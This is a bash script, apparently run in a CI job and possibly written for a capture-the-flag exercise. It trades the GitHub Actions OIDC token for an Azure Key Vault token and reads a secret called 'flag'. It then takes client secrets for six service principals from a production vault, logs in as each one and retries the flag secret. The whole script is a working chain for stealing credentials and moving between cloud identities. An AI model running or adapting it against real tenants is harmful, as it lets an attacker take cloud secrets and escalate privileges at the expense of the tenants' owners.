#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SEC="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"

oid() { python3 -c 'import sys,base64,json
t=sys.stdin.read().strip()
try:
 p=t.split(".")[1]; p+="="*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)).get("oid",""))
except Exception: print("")'; }

# 1) OIDC -> 72ff278a -> vault token
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

echo "== 72ff278a oid=$(printf '%s' "$VT" | oid) =="
curl -sS "$SEC" -H "Authorization: Bearer $VT" | head -c 400; echo

for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  js=$(curl -sS "$PROD/$name?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  cid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or d.get("clientId") or d.get("client_id",""))' 2>/dev/null)
  sc=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or d.get("client_secret") or d.get("password",""))' 2>/dev/null)
  t=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$sc" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  echo "== $name cid=$cid oid=$(printf '%s' "$t" | oid) =="
  curl -sS "$SEC" -H "Authorization: Bearer $t" | head -c 400; echo
done
echo END
